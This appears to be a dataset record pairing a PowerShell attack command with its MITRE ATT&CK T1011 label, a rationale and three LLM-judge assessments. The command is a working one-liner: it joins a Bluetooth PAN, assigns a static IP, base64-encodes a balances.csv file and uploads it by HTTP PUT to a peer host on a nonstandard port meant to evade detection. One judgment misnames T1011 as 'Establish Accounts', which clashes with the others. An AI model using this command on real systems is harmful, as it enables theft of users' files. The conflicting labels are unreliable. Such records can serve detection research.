command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Documents\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null
explanation: Uses HTTP PUT to a custom port over a Bluetooth PAN-isolated subnet to exfiltrate base64 data, aligning with exfiltration over another network medium (T1011).
rationale_steps: Establish Bluetooth PAN connectivity using a Bluetooth manipulation tool.
Assign a static /30 address to the Bluetooth interface with netsh.
Send base64 data using HTTP on a nonstandard port to reduce detection.
Destination IP is only reachable over Bluetooth, forcing that medium.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignment, piping, and cmdlet execution with appropriate parameters.
llm_judgments.semantic_justification: The command fully implements the T1011 technique by establishing a Bluetooth PAN connection, configuring a static IP on the interface, and exfiltrating base64-encoded file data over HTTP to a remote endpoint on a separate network medium.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct Powershell syntax, balanced quoting, valid command separators, and proper use of cmdlets, .NET methods, and external programs.
llm_judgments.semantic_justification: The command's operations—connecting to Bluetooth, configuring an IP, reading a file, and exfiltrating data—bear no resemblance to the T1011 "Establish Accounts" technique, which focuses on creating or abusing accounts.

llm_judgments.syntactic_justification: The PowerShell one-liner is well-formed with balanced quoting and parentheses, correct separators, and valid cmdlet and hashtable syntax.
llm_judgments.semantic_justification: It reasonably implements exfiltration over a Bluetooth PAN (T1011) by connecting to NAP, setting an interface IP, base64-encoding a file, and HTTP PUTing to the PAN peer, though the netsh command omits a gateway parameter and changing IP settings typically requires admin rights.
